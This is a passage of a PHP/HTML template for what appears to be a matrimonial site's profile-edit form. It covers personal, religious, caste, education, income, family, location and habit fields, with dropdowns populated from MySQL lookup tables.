                      <input type="text" class="form-control" placeholder="Enter Mobile No" data-validetta="required,number,minLength[10],maxLength[10]" value="<?php echo $row['mobile']; ?>" name="mobile">
                    </div>
                  </div>
                  </div>
                            <div class="form-group">
              <label>Date Of Birth
              </label>
              <div class="row">
                <div class="col-xs-4">
                  <select name="day" id="day" class="form-control" onchange="setDays(month,this,year)" data-validetta="required">
                    <?php
    $ad=explode('-',$row['birthdate']); 
    ?>
                    <option value="01">01
                    </option>
                    <option value="02">02
                    </option>
                    <option value="03">03
                    </option>
                    <option value="04">04
                    </option>
                    <option value="05">05
                    </option>
                    <option value="06">06
                    </option>
                    <option value="07">07
                    </option>
                    <option value="08">08
                    </option>
                    <option value="09">09
                    </option>
                    <option value="10">10
                    </option>
                    <option value="11">11
                    </option>
                    <option value="12">12
                    </option>
                    <option value="13">13
                    </option>
                    <option value="14">14
                    </option>
                    <option value="15">15
                    </option>
                    <option value="16">16
                    </option>
                    <option value="17">17
                    </option>
                    <option value="18">18
                    </option>
                    <option value="19">19
                    </option>
                    <option value="20">20
                    </option>
                    <option value="21">21
                    </option>
                    <option value="22">22
                    </option>
                    <option value="23">23
                    </option>
                    <option value="24">24
                    </option>
                    <option value="25">25
                    </option>
                    <option value="26">26
                    </option>
                    <option value="27">27
                    </option>
                    <option value="28">28
                    </option>
                    <option value="29">29
                    </option>
                    <option value="30">30
                    </option>
                    <option value="31">31
                    </option>
                    <option value="<?php if(isset($ad[2]) && $ad[2]!=''){ echo $ad[2];}?>" 
                            <?php if(isset($ad[2]) && $ad[2]!=''){ echo "selected"; }?>>
                    <?php if(isset($ad[2]) && $ad[2]!=''){ echo $ad[2];}?>
                    </option>
                  </select>
              </div>
              <div class="col-xs-4">
                <select name="month" id="month" class="form-control" onchange="setDays(this,day,year)" data-validetta="required">
                  <option value="01" 
                          <?php if(isset($ad[1]) && $ad[1]=='01') {echo "selected";} ?>>Jan
                  </option>
                <option value="02" 
                        <?php if(isset($ad[1]) && $ad[1]=='02') {echo "selected";} ?>>Feb
                </option>
              <option value="03" 
                      <?php if(isset($ad[1]) && $ad[1]=='03') {echo "selected";} ?>>Mar
              </option>
            <option value="04" 
                    <?php if(isset($ad[1]) && $ad[1]=='04') {echo "selected";} ?>>Apr
            </option>
          <option value="05" 
                  <?php if(isset($ad[1]) && $ad[1]=='05') {echo "selected";} ?>>May
          </option>
        <option value="06" 
                <?php if(isset($ad[1]) && $ad[1]=='06') {echo "selected";} ?>>Jun
        </option>
      <option value="07" 
              <?php if(isset($ad[1]) && $ad[1]=='07') {echo "selected";} ?>>Jul
      </option>
    <option value="08" 
            <?php if(isset($ad[1]) && $ad[1]=='08') {echo "selected";} ?>>Aug
    </option>
    <option value="09" 
            <?php if(isset($ad[1]) && $ad[1]=='09') {echo "selected";} ?>>Sep
    </option>
    <option value="10" 
            <?php if(isset($ad[1]) && $ad[1]=='10') {echo "selected";} ?>>Oct
    </option>
    <option value="11" 
            <?php if(isset($ad[1]) && $ad[1]=='11') {echo "selected";} ?>>Nov
    </option>
    <option value="12" 
            <?php if(isset($ad[1]) && $ad[1]=='12') {echo "selected";} ?>>Dec
    </option>
    </select>
    </div>
    <div class="col-xs-4">
      <select name="year" id="year" class="form-control" onchange="setDays(month,day,this)" data-validetta="required">
        <option value="1924">1924
        </option>
        <option value="1925">1925
        </option>
        <option value="1926">1926
        </option>
        <option value="1927">1927
        </option>
        <option value="1928">1928
        </option>
        <option value="1929">1929
        </option>
        <option value="1930">1930
        </option>
        <option value="1931">1931
        </option>
        <option value="1932">1932
        </option>
        <option value="1933">1933
        </option>
        <option value="1934">1934
        </option>
        <option value="1935">1935
        </option>
        <option value="1936">1936
        </option>
        <option value="1937">1937
        </option>
        <option value="1938">1938
        </option>
        <option value="1939">1939
        </option>
        <option value="1940">1940
        </option>
        <option value="1941">1941
        </option>
        <option value="1942">1942
        </option>
        <option value="1943">1943
        </option>
        <option value="1944">1944
        </option>
        <option value="1945">1945
        </option>
        <option value="1946">1946
        </option>
        <option value="1947">1947
        </option>
        <option value="1948">1948
        </option>
        <option value="1949">1949
        </option>
        <option value="1950">1950
        </option>
        <option value="1951">1951
        </option>
        <option value="1952">1952
        </option>
        <option value="1953">1953
        </option>
        <option value="1954">1954
        </option>
        <option value="1955">1955
        </option>
        <option value="1956">1956
        </option>
        <option value="1957">1957
        </option>
        <option value="1958">1958
        </option>
        <option value="1959">1959
        </option>
        <option value="1960">1960
        </option>
        <option value="1961">1961
        </option>
        <option value="1962">1962
        </option>
        <option value="1963">1963
        </option>
        <option value="1964">1964
        </option>
        <option value="1965">1965
        </option>
        <option value="1966">1966
        </option>
        <option value="1967">1967
        </option>
        <option value="1968">1968
        </option>
        <option value="1969">1969
        </option>
        <option value="1970">1970
        </option>
        <option value="1971">1971
        </option>
        <option value="1972">1972
        </option>
        <option value="1973">1973
        </option>
        <option value="1974">1974
        </option>
        <option value="1975">1975
        </option>
        <option value="1976">1976
        </option>
        <option value="1977">1977
        </option>
        <option value="1978">1978
        </option>
        <option value="1979">1979
        </option>
        <option value="1980">1980
        </option>
        <option value="1981">1981
        </option>
        <option value="1982">1982
        </option>
        <option value="1983">1983
        </option>
        <option value="1984">1984
        </option>
        <option value="1985">1985
        </option>
        <option value="1986">1986
        </option>
        <option value="1987">1987
        </option>
        <option value="1988">1988
        </option>
        <option value="1989">1989
        </option>
        <option value="1990">1990
        </option>
        <option value="1991">1991
        </option>
        <option value="1992">1992
        </option>
        <option value="1993">1993
        </option>
        <option value="1994">1994
        </option>
        <option value="1995">1995
        </option>
        <option value="1996">1996
        </option>
        <option value="1997">1997
        </option>
		  <option value="1998">1998
        </option>
		  <option value="1999">1999
        </option>
		  <option value="2000">2000
        </option>
		  <option value="2001">2001
        </option>
		  <option value="2002">2002
        </option>
		  <option value="2003">2003
        </option>
		  <option value="2004">2004
        </option>
		  <option value="2005">2005
        </option>
		  <option value="2006">2006
        </option>
		  <option value="2007">2007
        </option>
		  <option value="2008">2008
        </option>
		  <option value="2009">2009
        </option>
		  <option value="2010">2010
        </option>
        <option value="<?php if(isset($ad[0]) && $ad[0]!='') {echo $ad[0];}?>" 
                <?php if(isset($ad[0]) && $ad[0]!='') {echo "selected";}?>>
        <?php echo $ad[0];?>
        </option>
      </select>
    </div>
    </div>
    </div>
                            <div class="form-group" id="dis_child">
      <label>No Of Children
      </label>
      <select class="form-control" name="no_child">
        <option value=""> Select No Of Children
        </option>
        <option value="0" 
                <?php if(isset($row['tot_children']) && $row['tot_children']=='0') { echo "selected";}?>>None
        </option>
      <option value="One" 
              <?php if(isset($row['tot_children']) && $row['tot_children']=='One') { echo "selected";}?>>1
      </option>
    <option value="Two" 
            <?php if(isset($row['tot_children']) && $row['tot_children']=='Two') { echo "selected";}?>>2
    </option>
    <option value="Three" 
            <?php if(isset($row['tot_children']) && $row['tot_children']=='Three') { echo "selected";}?>>3
    </option>
    <option value="Four and above" 
            <?php if(isset($row['tot_children']) && $row['tot_children']=='Four and above') { echo "selected";}?>>4 and above
    </option>
    </select>
    </div> 
							<div class="form-group">
  <label>Mother Tounge:
  </label>
  <select name="mothertongue" class="form-control" data-validetta="required">
    <option value="">Select Your Mothertogue</option>
    <?php
$SQL_STATEMENT_Mtongu =  $DatabaseCo->dbLink->query("SELECT * FROM mothertongue WHERE status='APPROVED' ORDER BY mtongue_name ASC");
while($DatabaseCo->dbRow = mysqli_fetch_object($SQL_STATEMENT_Mtongu))
{
?>
    <option value="<?php echo $DatabaseCo->dbRow->mtongue_id; ?>"  
            <?php if($DatabaseCo->dbRow->mtongue_id==$row['m_tongue']){echo "selected";} ?>>
    <?php echo $DatabaseCo->dbRow->mtongue_name; ?>
    </option>
  <?php } ?>
  </select>
</div>
							<div class="form-group">
                                            <label>Profile Created By
                                            </label>
                                            <select class="form-control" name="profileby">
                                              <option value="Self" 
                                                      <?php if(isset($row['profileby']) && $row['profileby']=='Self'){ echo "selected";}?>>Self
                                              </option>
                                            <option value="Parents" 
                                                    <?php if(isset($row['profileby']) && $row['profileby']=='Parents'){ echo "selected";}?>>Parents
                                            </option>
                                          <option value="Guardian" 
                                                  <?php if(isset($row['profileby']) && $row['profileby']=='Guardian'){ echo "selected";}?>>Guardian
                                          </option>
                                        <option value="Friends" 
                                                <?php if(isset($row['profileby']) && $row['profileby']=='Friends'){ echo "selected";}?>>Friends
                                        </option>
                                      <option value="Sibling" 
                                              <?php if(isset($row['profileby']) && $row['profileby']=='Sibling'){ echo "selected";}?>>Sibling
                                      </option>
                                    <option value="Relatives" 
                                            <?php if(isset($row['profileby']) && $row['profileby']=='Relatives'){ echo "selected";}?>>Relatives
                                    </option>	
                                  </select>
                              </div>
          				</div>
          				<div class="col-md-6">
                            <div class="form-group">
                              <label>Email Id
                              </label>
                              <input type="email" class="form-control" placeholder="Enter Email Id" data-validetta="required,email" value="<?php echo $row['email']; ?>" name="email">
                            </div>
                            <div class="form-group">
              <label>Gender
              </label>
              <select class="form-control" data-validetta="required" name="gender">
                <option value=""> Select Gender 
                </option>
                <option value="Female" 
                        <?php if(isset($row['gender']) && $row['gender']=='Female') { echo "selected";}?>> Female 
                </option>
              <option value="Male" 
                      <?php if(isset($row['gender']) && $row['gender']=='Male') { echo "selected";}?>> Male 
              </option>
            </select>
        </div>
                            <div class="form-group">
      <label>Marital Status
      </label>
      <select class="form-control" data-validetta="required" name="m_status" onChange="check_status(this.value)">
        <option value="">Select Your Marital Status
        </option>
        <option value="Never Married" 
                <?php if(isset($row['m_status']) && $row['m_status']=='Never Married') { echo "selected";}?>>Never Married
        </option>
      <option value="Widower" 
              <?php if(isset($row['m_status']) && $row['m_status']=='Widower') { echo "selected";}?>>Widower
      </option>
       <option value="Widow" 
              <?php if(isset($row['m_status']) && $row['m_status']=='Widow') { echo "selected";}?>>Widow
      </option>
    <option value="Divorced" 
            <?php if(isset($row['m_status']) && $row['m_status']=='Divorced') { echo "selected";}?>>Divorced
    </option>
    <option value="Awaiting Divorce" 
            <?php if(isset($row['m_status']) && $row['m_status']=='Awaiting Divorce') { echo "selected";}?>>Awaiting Divorce
    </option>
    </select>
    </div>
    						<div class="form-group">
    <label>Children Living Status
    </label>
    <select class="form-control" name="child_status">
      <option value="">Select Children Living Status
      </option>
      <option value="Living with me" 
              <?php if(isset($row['status_children']) && $row['status_children']=='Living with me') { echo "selected";}?>>Living with me
      </option>
    <option value="Not living with me" 
            <?php if(isset($row['status_children']) && $row['status_children']=='Not living with me') { echo "selected";}?>>Not living with me
    </option>
  </select>
</div>
                            
                            <div class="form-group">
                              <label>Password
                              </label>
                              <input type="password" class="form-control" placeholder="Enter Password"  name="my_pass" 
                                     <?php if(!isset($_GET['matri_id'])){?>data-validetta="required" 
                              <?php }?>>
                            </div>
                            <div class="form-group">
                              <label>Confirm Password
                              </label>
                              <input type="password" class="form-control" 
                                     <?php if(!isset($_GET['matri_id'])){?>data-validetta="required,equalTo[my_pass]" 
                              <?php }?> placeholder="Enter Confirm Password">
                            </div>
          			   </div>
          		     </div>
        <h3 class="text-success">
          <i class="fa fa-user gtMarginRight10">
          </i>&nbsp;Religion Information
        </h3>
        <div class="row">
          <div class="col-md-6">
            <div class="form-group">
  <label>Religion
  </label>
  <select class="form-control" name="religion_id" id="religion_id" onchange="GetCaste('../ajax_search2.php?religionId='+this.value)" data-validetta="required">
    <option value="">Select Your Religion
    </option>
    <?php
$rel=$row['religion'];
$SQL_STATEMENT_religion = $DatabaseCo->dbLink->query("SELECT * FROM religion WHERE status='APPROVED' ORDER BY religion_name ASC");
while($DatabaseCo->dbRow = mysqli_fetch_object($SQL_STATEMENT_religion))
{
?>
    <option value="<?php echo $DatabaseCo->dbRow->religion_id; ?>" 
            <?php if($DatabaseCo->dbRow->religion_id==$rel){echo "selected";} ?>>
    <?php echo $DatabaseCo->dbRow->religion_name; ?>
    </option>
  <?php                                 
} 
?>
  </select>
</div>
        	<div class="form-group">
  <label class="col-xs-10">Willing To Marry In Other Caste ?
  </label>
  <span class="col-xs-2">
    <input type="checkbox" name="willing_to_mary" value="1" 
           <?php if(isset($row['will_to_mary_caste']) && $row['will_to_mary_caste']=='1') { echo "checked";}?>>
  </span>
</div>
		  </div>
		  <div class="col-md-6">
			<div class="form-group">
  <label>Caste
  </label>
  <select class="form-control" data-validetta="required" id="CasteDiv" name="caste_id">
    <option value="<?php echo $row['caste']; ?>">
      <?php echo $row['caste_name']; ?>
    </option>             
  </select>
</div>
	  <div class="form-group">
  <label>Sub Caste
  </label>
  <select class="form-control" name="sub_caste_id">
    <option value=""> Select
            </option>
            <?php
        $SQL_STATEMENT_subcaste= $DatabaseCo->dbLink->query("SELECT * FROM sub_caste WHERE status='APPROVED' ORDER BY sub_caste_name ASC");
        while($DatabaseCo->dbRow = mysqli_fetch_object($SQL_STATEMENT_subcaste))
        {
        ?>
            <option value="<?php echo $DatabaseCo->dbRow->sub_caste_id; ?>" 
                    <?php if($DatabaseCo->dbRow->sub_caste_id==$row['subcaste']){echo "selected";} ?>>
            <?php echo $DatabaseCo->dbRow->sub_caste_name; ?>
            </option>
          <?php } ?>             
  </select>
</div>
		  </div>
		</div>
        <h3 class="text-success">
  			<i class="fa fa-university gtMarginRight10"></i>&nbsp;Education & Occupation Details
		</h3>
		<div class="row">
          <div class="col-md-6">
            <div class="form-group">
              <label>Highest Education
              </label>
              <select class="form-control" name="edu_id" id="edu_id" data-validetta="required">
                <option value="">Select Your Highest Education
                </option>
                <?php
        $eduucation = explode(",",$row['edu_detail']);
        $SQL_STATEMENT_edu =  $DatabaseCo->dbLink->query("SELECT * FROM education_detail WHERE status='APPROVED' ORDER BY edu_name ASC");
        while($DatabaseCo->dbRow = mysqli_fetch_object($SQL_STATEMENT_edu))
        {
        ?>
                <option value="<?php echo $DatabaseCo->dbRow->edu_id; ?>" 
                        <?php if(isset($eduucation[0]) && $DatabaseCo->dbRow->edu_id==$eduucation[0]){echo "selected";} ?>>
                <?php echo $DatabaseCo->dbRow->edu_name; ?>
                </option>
              <?php 
        } 
        ?>
              </select>
          </div>
            <div class="form-group">
            <label>Employed In
            </label>
            <select class="form-control" name="employed_in" >
              <option value="<?php echo $row['emp_in']; ?>">
                <?php echo $row['emp_in']; ?>
              </option>
              <option value="Private">Private
              </option>
              <option value="Government">Government
              </option>
              <option value="Business">Business
              </option>
              <option value="Defence">Defence
              </option>
              <option value="Self Employed">Self Employed
              </option>
              <option value="Not Working">Not Working
              </option>
            </select>
          </div>
            <div class="form-group">
            <label>Annual Income
            </label>
            <select class="form-control" name="annual_income">
              <option value="<?php echo $row['income']; ?>">
                <?php echo $row['income']; ?>
              </option>                                                                                   
              <option value="Rs 10,000 - 50,000">Rs 10,000 - 50,000</option>
                            <option value="Rs 50,000 - 1,00,000">Rs 50,000 - 1,00,000</option>
                            <option value="Rs 1,00,000 - 2,00,000">Rs 1,00,000 - 2,00,000</option>
                            <option value="Rs 2,00,000 - 4,00,000">Rs 2,00,000 - 4,00,000</option>
                            <option value="Rs 4,00,000 - 6,00,000">Rs 4,00,000 - 6,00,000</option>
                            <option value="Rs 6,00,000 - 8,00,000">Rs 6,00,000 - 8,00,000</option>
                            <option value="Rs 8,00,000 - 10,00,000">Rs 8,00,000 - 10,00,000</option>
                            <option value="Rs 10,00,000 - 12,00,000">Rs 10,00,000 - 12,00,000</option>
                            <option value="Rs 12,00,000 - 14,00,000">Rs 12,00,000 - 14,00,000</option>
                            <option value="Rs 14,00,000 - 16,00,000">Rs 14,00,000 - 16,00,000</option>
                            <option value="Rs 16,00,000 - 18,00,000">Rs 16,00,000 - 18,00,000</option>
                            <option value="Rs 18,00,000 - 20,00,000">Rs 18,00,000 - 20,00,000</option>
                            <option value="Rs 20,00,000 - 22,00,000">Rs 20,00,000 - 22,00,000</option>
                            <option value="Rs 22,00,000 - 24,00,000">Rs 22,00,000 - 24,00,000</option>
                            <option value="Rs 24,00,000 - 26,00,000">Rs 24,00,000 - 26,00,000</option>
                            <option value="Rs 26,00,000 - 28,00,000">Rs 26,00,000 - 28,00,000</option>
                            <option value="Rs 28,00,000 - 30,00,000">Rs 28,00,000 - 30,00,000</option>
                            <option value="Rs 30,00,000 - 32,00,000">Rs 30,00,000 - 32,00,000</option>
                            <option value="Rs 32,00,000 - 34,00,000">Rs 32,00,000 - 34,00,000</option>
                            <option value="Rs 34,00,000 - 36,00,000">Rs 34,00,000 - 36,00,000</option>
                            <option value="Rs 36,00,000 - 38,00,000">Rs 36,00,000 - 38,00,000</option>
                            <option value="Rs 38,00,000 - 40,00,000">Rs 38,00,000 - 40,00,000</option>
                            <option value="Rs 40,00,000 - 42,00,000">Rs 40,00,000 - 42,00,000</option>
                            <option value="Rs 42,00,000 - 44,00,000">Rs 42,00,000 - 44,00,000</option>
                            <option value="Rs 44,00,000 - 46,00,000">Rs 44,00,000 - 46,00,000</option>
                            <option value="Rs 46,00,000 - 48,00,000">Rs 46,00,000 - 48,00,000</option>
                            <option value="Rs 48,00,000 - 50,00,000">Rs 48,00,000 - 50,00,000</option>
                            <option value="Rs 50,00,000 - 52,00,000">Rs 50,00,000 - 52,00,000</option>
                            <option value="Rs 52,00,000 - 54,00,000">Rs 52,00,000 - 54,00,000</option>
                            <option value="Rs 54,00,000 - 56,00,000">Rs 54,00,000 - 56,00,000</option>
                            <option value="Rs 56,00,000 - 58,00,000">Rs 56,00,000 - 58,00,000</option>
                            <option value="Rs 58,00,000 - 60,00,000">Rs 58,00,000 - 60,00,000</option>
                            <option value="Rs 60,00,000 - 62,00,000">Rs 60,00,000 - 62,00,000</option>
                            <option value="Rs 62,00,000 - 64,00,000">Rs 62,00,000 - 64,00,000</option>
                            <option value="Rs 64,00,000 - 66,00,000">Rs 64,00,000 - 66,00,000</option>
                            <option value="Rs 66,00,000 - 68,00,000">Rs 66,00,000 - 68,00,000</option>
                            <option value="Rs 68,00,000 - 70,00,000">Rs 68,00,000 - 70,00,000</option>
                            <option value="Rs 70,00,000 - 72,00,000">Rs 70,00,000 - 72,00,000</option>
                            <option value="Rs 72,00,000 - 74,00,000">Rs 72,00,000 - 74,00,000</option>
                            <option value="Rs 74,00,000 - 76,00,000">Rs 74,00,000 - 76,00,000</option>
                            <option value="Rs 76,00,000 - 78,00,000">Rs 76,00,000 - 78,00,000</option>
                            <option value="Rs 78,00,000 - 80,00,000">Rs 78,00,000 - 80,00,000</option>
                            <option value="Rs 80,00,000 - 82,00,000">Rs 80,00,000 - 82,00,000</option>
                            <option value="Rs 82,00,000 - 84,00,000">Rs 82,00,000 - 84,00,000</option>
                            <option value="Rs 84,00,000 - 86,00,000">Rs 84,00,000 - 86,00,000</option>
                            <option value="Rs 86,00,000 - 88,00,000">Rs 86,00,000 - 88,00,000</option>
                            <option value="Rs 88,00,000 - 90,00,000">Rs 88,00,000 - 90,00,000</option>
                            <option value="Rs 90,00,000 - 92,00,000">Rs 90,00,000 - 92,00,000</option>
                            <option value="Rs 92,00,000 - 94,00,000">Rs 92,00,000 - 94,00,000</option>
                            <option value="Rs 94,00,000 - 96,00,000">Rs 94,00,000 - 96,00,000</option>
                            <option value="Rs 96,00,000 - 98,00,000">Rs 96,00,000 - 98,00,000</option>
                            <option value="Rs 98,00,000 - 1,00,00,000">Rs 98,00,000 - 1,00,00,000</option>
				<option value="Not Working">Not Working</option>
            </select>
          </div>
          </div>
        <div class="col-md-6">
            <div class="form-group">
            <label>Additional Degree
            </label>
            <select class="form-control" name="edu_id1" id="edu_id1" >
              <option value="">Select Your Additional Degree
              </option>
              <?php
        $SQL_STATEMENT_edu1 =  $DatabaseCo->dbLink->query("SELECT * FROM education_detail WHERE status='APPROVED' ORDER BY edu_name ASC");
        while($DatabaseCo->dbRow = mysqli_fetch_object($SQL_STATEMENT_edu1))
        {
        ?>
              <option value="<?php echo $DatabaseCo->dbRow->edu_id; ?>" 
                      <?php if(isset($eduucation[1]) && $DatabaseCo->dbRow->edu_id==$eduucation[1]){echo "selected";} ?>>
              <?php echo $DatabaseCo->dbRow->edu_name; ?>
              </option>
            <?php } ?>
            </select>
        </div>
            <div class="form-group">
          <label>Occupation
          </label>
          <select class="form-control" name="occupation" data-validetta="required">
            <option value=""> Select Occupation 
            </option>
            <?php
        $SQL_STATEMENT_ocp = $DatabaseCo->dbLink->query("SELECT * FROM occupation WHERE status='APPROVED' ORDER BY ocp_name ASC");
        while($DatabaseCo->dbRow = mysqli_fetch_object($SQL_STATEMENT_ocp))
        {
        ?>
            <option value="<?php echo $DatabaseCo->dbRow->ocp_id; ?>" 
                    <?php if($DatabaseCo->dbRow->ocp_id==$row['occupation']){echo "selected";} ?>>
            <?php echo $DatabaseCo->dbRow->ocp_name; ?>
            </option>
          <?php } ?>
          </select>   
        </div>
        </div>
</div>
		<h3 class="text-success">
  			<i class="fa fa-group gtMarginRight10"></i>&nbsp;Family Details
		</h3>
		<div class="row">
  <div class="col-md-6">
  	<div class="form-group">
  <label>Family Type
  </label>
  <select class="form-control" name="family_type" >
    <option value="">Select Family Type
    </option>
    <option value="Joint" 
            <?php if($row['family_type']=='Joint'){ echo "selected";}?>>Joint
    </option>
  <option value="Nuclear" 
          <?php if($row['family_type']=='Nuclear'){ echo "selected";}?>>Nuclear
  </option>
</select>
</div>
	<div class="form-group">
  <label>Family value
  </label>
  <select class="form-control" name="family_value" >
    <option value="">Select Family Values
    </option>
    <option value="Orthodox" 
            <?php if($row['family_value']=='Orthodox'){ echo "selected";}?>>Orthodox
    </option>
  <option value="Traditional" 
          <?php if($row['family_value']=='Traditional'){ echo "selected";}?>>Traditional
  </option>
<option value="Moderate" 
        <?php if($row['family_value']=='Moderate'){ echo "selected";}?>>Moderate
</option>
<option value="Liberal" 
        <?php if($row['family_value']=='Liberal'){ echo "selected";}?>>Liberal
</option>
</select>
</div>
	<div class="form-group">
  <label>Mothers Occupation
  </label>
  <input type="text" class="form-control" name="mother_occupation" placeholder="Enter Fathers Occupation" value="<?php if($row['mother_occupation']!='Not Available'){ echo htmlspecialchars_decode($row['mother_occupation'],ENT_QUOTES);}?>">
</div>
    <div class="form-group">
  <label>No Of Married Brothers
  </label>
  <select class="form-control" name="no_of_marri_brother">
    <option value="">Select
    </option>
    <option value="No married brother" 
            <?php if($row['no_marri_brother']=="No married brother"){ ?> selected="selected"
    <?php } ?>>No married brother
    </option>
  <option value="1 married brother" 
          <?php if($row['no_marri_brother']=="1 married brother"){ ?> selected="selected"
  <?php } ?>>1 married brother
  </option>
<option value="2 married brothers" 
        <?php if($row['no_marri_brother']=="2 married brothers"){ ?> selected="selected"
<?php } ?>>2 married brothers
</option>
<option value="3 married brothers" 
        <?php if($row['no_marri_brother']=="3 married brothers"){ ?> selected="selected"
<?php } ?>>3 married brothers
</option>
<option value="4 married brothers" 
        <?php if($row['no_marri_brother']=="4 married brothers"){ ?> selected="selected"
<?php } ?>>4 married brothers
</option>
<option value="4 + married brothers" 
        <?php if($row['no_marri_brother']=="4 + married brothers"){ ?> selected="selected"
<?php } ?>>4 + married brothers
</option>
</select>
</div>
	<div class="form-group">
  <label>No Of Married Sisters
  </label>
  <select class="form-control" name="no_of_marri_sister">
    <option value="">Select
    </option>
    <option value="No married sister" 
            <?php if($row['no_marri_sister']=="No married sister"){ ?> selected="selected"
    <?php } ?>>No married sister
    </option>
  <option value="1 married sister" 
          <?php if($row['no_marri_sister']=="1 married sister"){ ?> selected="selected"
  <?php } ?>>1 married sister
  </option>
<option value="2 married sisters" 
        <?php if($row['no_marri_sister']=="2 married sisters"){ ?> selected="selected"
<?php } ?>>2 married sisters
</option>
<option value="3 married sisters" 
        <?php if($row['no_marri_sister']=="3 married sisters"){ ?> selected="selected"
<?php } ?>>3 married sisters
</option>
<option value="4 married sisters" 
        <?php if($row['no_marri_sister']=="4 married sisters"){ ?> selected="selected"
<?php } ?>>4 married sisters
</option>
<option value="4+ married sisters" 
        <?php if($row['no_marri_sister']=="4+ married sisters"){ ?> selected="selected"
<?php } ?>>4+ married sisters
</option>
</select>
</div>
</div>
<div class="col-md-6">
	<div class="form-group">
      <label>Family Status
      </label>
      <select class="form-control" name="family_status">
        <option value="">Select Family Status
        </option>
        <option value="Middle class" 
                <?php if($row['family_status']=='Middle class'){ echo "selected";}?>>Middle class
        </option>
      <option value="Upper middle class" 
              <?php if($row['family_status']=='Upper middle class'){ echo "selected";}?>>Upper middle class
      </option>
    <option value="Rich" 
            <?php if($row['family_status']=='Rich'){ echo "selected";}?>>Rich
    </option>
  <option value="Affluent" 
          <?php if($row['family_status']=='Affluent'){ echo "selected";}?>>Affluent
  </option>
</select>
</div>
	<div class="form-group">
  <label>Fathers Occupation
  </label>
  <input type="text" class="form-control" name="father_occupation" placeholder="Enter Fathers Occupation" value="<?php if($row['father_occupation']!='Not Available'){ echo htmlspecialchars_decode($row['father_occupation'],ENT_QUOTES);}?>">
</div>
    <div class="form-group">
    <label>No Of Brothers
    </label>
    <select class="form-control" name="no_of_brother">
      <option value="">Select
      </option>
      <option value="No Brother" 
              <?php if($row['no_of_brothers']=='No Brother'){echo "selected";}?>>No Brother
      </option>
    <option value="1 Brother" 
            <?php if($row['no_of_brothers']=='1 Brother'){echo "selected";}?>>1 Brother
    </option>
  <option value="2 Brothers" 
          <?php if($row['no_of_brothers']=='2 Brothers'){echo "selected";}?>>2 Brothers
  </option>
<option value="3 Brothers" 
        <?php if($row['no_of_brothers']=='3 Brothers'){echo "selected";}?>>3 Brothers
</option>
<option value="4 Brothers" 
        <?php if($row['no_of_brothers']=='4'){echo "selected";}?>>4 Brothers
</option>
<option value="4 + Brothers" 
        <?php if($row['no_of_brothers']=='4 + Brothers'){echo "selected";}?>>4 + Brothers
</option>
</select>
</div>
	<div class="form-group">
  <label>No Of Sisters
  </label>
  <select class="form-control" name="no_of_sister">
    <option value="">Select
    </option>
    <option value="No Sister" 
            <?php if(isset($row['no_of_sisters']) && $row['no_of_sisters']=='No Sister'){echo "selected";}?>>No Sister
    </option>
  <option value="1 Sister" 
          <?php if(isset($row['no_of_sisters']) && $row['no_of_sisters']=='1 Sister'){echo "selected";}?>>1 Sister
  </option>
<option value="2 Sisters" 
        <?php if(isset($row['no_of_sisters']) && $row['no_of_sisters']=='2 Sisters'){echo "selected";}?>>2 Sisters
</option>
<option value="3 Sisters" 
        <?php if(isset($row['no_of_sisters']) && $row['no_of_sisters']=='3 Sisters'){echo "selected";}?>>3 Sisters
</option>
<option value="4 Sisters" 
        <?php if(isset($row['no_of_sisters']) && $row['no_of_sisters']=='4 Sisters'){echo "selected";}?>>4 Sisters
</option>
<option value="4 + Sisters" 
        <?php if(isset($row['no_of_sisters']) && $row['no_of_sisters']=='4 + Sisters'){echo "selected";}?>>4 + Sisters
</option>
</select>
</div>
</div>
</div>
<h3 class="text-success">
  <i class="fa fa-map-marker gtMarginRight10">
  </i>&nbsp;Location Details
</h3>
<div class="row">
  <div class="col-md-6">
    <div class="form-group">
      <label>Country Living In
      </label>
      <select class="form-control" name="country_id" id="country_id" data-validetta="required">
        <option value="">Select Your Country
        </option>
        <?php
$SQL_STATEMENT =  $DatabaseCo->dbLink->query("SELECT * FROM country WHERE status='APPROVED'");
while($DatabaseCo->dbRow = mysqli_fetch_object($SQL_STATEMENT))
{
?>
        <option value="<?php echo $DatabaseCo->dbRow->country_id; ?>" 
                <?php if($DatabaseCo->dbRow->country_id==$row['country_id']){echo "selected";} ?>>
        <?php echo $DatabaseCo->dbRow->country_name; ?>
        </option>
      <?php } ?>
      </select>
    <div id="status123">
    </div>
  </div>
    <div class="form-group">
    <label>City Living In
    </label>
    <select class="form-control" name="city" id="city123" data-validetta="required">
      <option value="">Select state first
      </option>
      <?php 
$query="select * from city where city_id = '".$row['city']."'";
$result=$DatabaseCo->dbLink->query($query);
while($a=mysqli_fetch_array($result)) 
{  
?>
      <option value="<?php echo $a['city_id']?>" 
              <?php if($row['city']==$a['city_id']){ ?> selected="selected" 
      <?php } ?>>
      <?php echo $a['city_name']?>
      </option>
    <?php
}
?>   
    </select>
</div>
</div>
<div class="col-md-6">
  	<div class="form-group">
    <label>State Living In
    </label>
    <select class="form-control" id="state123" name="state" data-validetta="required">
      <option value="<?php echo $row['state_id']; ?>">
        <?php echo $row['state_name']; ?>
      </option>   
    </select>
    <div id="status23">
    </div>
  </div>
</div>
</div>
<h3 class="text-success">
  <i class="fa fa-glass gtMarginRight10">
  </i>&nbsp;Habits & Hobbies
</h3>
<div class="row">
  <div class="col-md-6">
    <div class="form-group">
      <label>Diet
      </label>
      <select class="form-control" name="diet">
        <option value="">Select
        </option>
        <option value="Vegetarian" 
                <?php if($row['diet']=='Vegetarian'){ echo "selected";}?>>Vegetarian
        </option>
      <option value="Non-Vegetarian" 
              <?php if($row['diet']=='Non-Vegetarian'){ echo "selected";}?>>Non-Vegetarian
      </option>
    <option value="Eggetarian" 
            <?php if($row['diet']=='Eggetarian'){ echo "selected";}?>>Eggetarian
    </option>
  </select>
</div>
	<div class="form-group">
  <label>Smoking Habits
  </label>
  <select class="form-control" name="smoke">
    <option value="">Select
    </option>
    <option value="No" 
            <?php if($row['smoke']=='No'){ echo "selected";}?>>No
    </option>
  <option value="Yes" 
          <?php if($row['smoke']=='Yes'){ echo "selected";}?>>Yes
  </option>
<option value="Occasionally" 
        <?php if($row['smoke']=='Occasionally'){ echo "selected";}?>>Occasionally
</option>
</select>
</div>
	<div class="form-group">
      <label>Language known
      </label>
      <select class="chosen-select form-control" multiple name="language[]">
        <?php
$search_array912 = explode(',',$row['language_known']);
$SQL_STATEMENT_pmtong = $DatabaseCo->dbLink->query("SELECT * FROM mothertongue WHERE status='APPROVED' ORDER BY mtongue_name ASC");
while($DatabaseCo->dbRow = mysqli_fetch_object($SQL_STATEMENT_pmtong))
{
?>
